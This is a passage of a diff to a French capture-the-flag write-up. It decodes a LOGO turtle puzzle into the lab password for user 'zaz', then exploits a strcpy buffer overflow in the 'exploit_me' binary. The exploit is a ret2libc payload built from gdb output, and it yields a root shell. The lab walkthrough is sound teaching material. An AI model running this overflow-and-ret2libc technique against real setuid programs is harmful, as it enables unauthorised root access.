@@ -553,8 +553,7 @@ Cependant le mot de passe de l'ISO est :
 
 On trouve un fichier **turtle** qui contient des instructions telles que:
 
-<pre><code>
-Avance 100 spaces
+<pre><code>Avance 100 spaces
 ...
 Tourne droite de 90 degrees
 ...
@@ -565,8 +564,7 @@ Recule 200 spaces
 </code></pre>
 
 Apres quelques recherches, on trouve qu'il s'agit d'un langage se nommant **LOGO**. On transforme le code avec les vraies instructions :
-<pre><code>
-forward(100)
+<pre><code>forward(100)
 ...
 right(90)
 ...
@@ -575,3 +573,102 @@ left(1)
 Recule 200 spaces
 ...
 </code></pre>
+
+À l'aide d'un interpréteur en ligne : https://www.calormen.com/jslogo/
+On lance le code ainsi transformé bloc par bloc qui donnent :
+S L A S H
+
+Avec SLASH dans MD5 on trouve : <code>646da671ca01bb5d84dbb5fb2238dc8e</code>
+qui est le mot de passe de zaz.
+
+# Partie Exploit Me
+En se connectant a zaz on trouve le binaire **./exploit_me**
+
+```
+> gdb -q ./exploit_me
+(gdb)> disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea    0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+```
+<pre><code>0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)</code></pre>
+>Le compare nous indique que le programme attend 1 seul argument.
+```
+0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+```
+>strcpy copie et stocke notre premier argument dans la stack sans vérifier si la taille de l'argument correspond à celle du buffer de destination.
+
+La fonction est donc exploitable par <code>buffer_overflow</code> pour corrompre les valeurs sauvegardées de **%ebp** et **%eip**
+```
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048425 in main ()
+(gdb) i f
+Stack level 0, frame at 0xbffff720:
+ eip = 0x8048425 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff718, args:
+ Locals at 0xbffff718, Previous frame's sp is 0xbffff720
+ Saved registers:
+  ebp at 0xbffff718, eip at 0xbffff71c
+(gdb) x/30x $esp
+0xbffff680:     0xbffff690      0xbffff8f4      0x00000000      0x00000000
+0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6c0:     0x41414141      0x00004141      0xbffff71c      0xb7fd0ff4
+0xbffff6d0:     0x08048440      0x080496e8      0x00000002      0x080482dd
+0xbffff6e0:     0xb7fd13e4      0x00080000      0x080496e8      0x08048461
+0xbffff6f0:     0xffffffff      0xb7e5edc6
+```
+Hex value:
+bffff71c - bffff690 = 8C
+>bffff71c : eip saved | bffff690 : buffer beggining
+
+Decimal value:
+3221223196 - 3221223056 = 140
+>Offset : 140 characters
+
+De 141 à 144 caractères on écrit sur l'adresse sauvegardée de **%eip**
+
+Pour l'exploiter on va effectuer un <code>ret_to_libc</code> : le but étant de récupérer l'adresse de la fonction **system** et **exit**
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+```
+> On a ici les adresses de **system**, **exit** et de la variable d'environnement **/bin/sh**
+
+```
+./exploit_me `python -c "print '\x90'*140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`
+```
+>On réécrit l'adresse de **system** sur l'adresse sauvegardée de **%eip**, puis l'adresse de **exit** pour que le programme quitte normalement à la sortie du shell et enfin l'adresse de **/bin/sh** pour lancer un terminal.
+
+Nous obtenons donc un terminal avec les droits **root** : 
+```
+> whoami
+root
+```
